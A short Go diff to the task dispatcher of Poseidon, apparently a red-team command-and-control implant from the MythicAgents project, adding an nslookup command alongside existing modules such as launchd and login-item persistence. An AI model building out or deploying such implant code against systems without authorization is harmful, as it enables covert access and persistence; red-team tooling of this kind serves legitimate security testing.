@@ -32,6 +32,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/lsopen"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
+    "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/nslookup"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/runtimeMainThread"
@@ -201,6 +202,8 @@ func listenForNewTask() {
 			go ifconfig.Run(task)
 		case "caffeinate":
 			go caffeinate.Run(task)
+	  case "nslookup":
+      go nslookup.Run(task)
 		case "lsopen":
 			go lsopen.Run(task)
 		case "chmod":
